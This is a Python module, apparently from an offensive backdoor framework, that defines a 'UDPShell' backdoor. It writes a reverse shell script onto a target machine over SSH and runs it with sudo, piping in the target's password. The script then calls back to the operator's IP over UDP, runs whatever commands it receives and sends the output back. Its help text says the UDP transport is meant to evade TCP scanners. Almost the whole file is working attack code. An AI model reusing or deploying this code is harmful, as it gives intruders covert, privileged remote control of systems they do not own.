#This is the template to create backdoors. Please copy your backdoor into the suggested spots. Places you need to input are shown by ~tildes~.
from backdoors.backdoor import *
#Remember extra imports.

class UDPShell(Backdoor):
    prompt = Fore.RED + "(updshell) " + Fore.BLUE + ">> " + Fore.RESET

    def __init__(self, core):
        cmd.Cmd.__init__(self)
        self.intro = GOOD + "Using UDPShell module..."
        self.core = core
        self.options = {
                "port"   : Option("port", 53941, "port to connect to", True),
                "name"   : Option("name", "yee.py", "name of backdoor", True),
                }
        self.allow_modules = True
        self.modules = {}
        self.help_text = "Python reverse shell using UDP to evade TCP scanners."

    def get_command(self):
        toRet = "echo " + self.core.curtarget.pword + " | sudo -S python " + str(self.get_value("name")) + " " + self.core.localIP + " " + str(self.get_value("port"))
        print(toRet)
        return toRet

    def do_exploit(self, args):

        string = "import socket \nimport subprocess\nimport sys\nfrom random import randint\n\
recv_ip = \\\"0.0.0.0\\\"\nrecv_port = randint(1024, 65535)\nsend_ip = sys.argv[1]\n\
send_port = int(sys.argv[2])\nsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\nsock.bind((recv_ip, recv_port))\n\
sock.sendto(\\\"Begin Connection id: 3242\\\", (send_ip, send_port))\n\
while True:\n\
    command, addr = sock.recvfrom(1024)\n\
    if(command == \\\"exit\\\"):\n\
        break\n\
    proc = subprocess.Popen([command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)\n\
    output = proc.stdout.read() + proc.stderr.read()\n\
    sock.sendto(output, (send_ip, send_port))"
        #self.listen("none", "none")
        print("Run python backdoors/shell/__udpshell/udpclient.py " + str(self.get_value("port")) + ". Press enter when ready.")
        raw_input()
        self.core.curtarget.ssh.exec_command("echo \"" + string + "\" > " + str(self.get_value("name")))
        self.core.curtarget.ssh.exec_command(self.get_command())
        for mod in self.modules.keys():
            print(INFO + "Attempting to execute " + mod.name + " module...")
            mod.exploit(self.get_command())


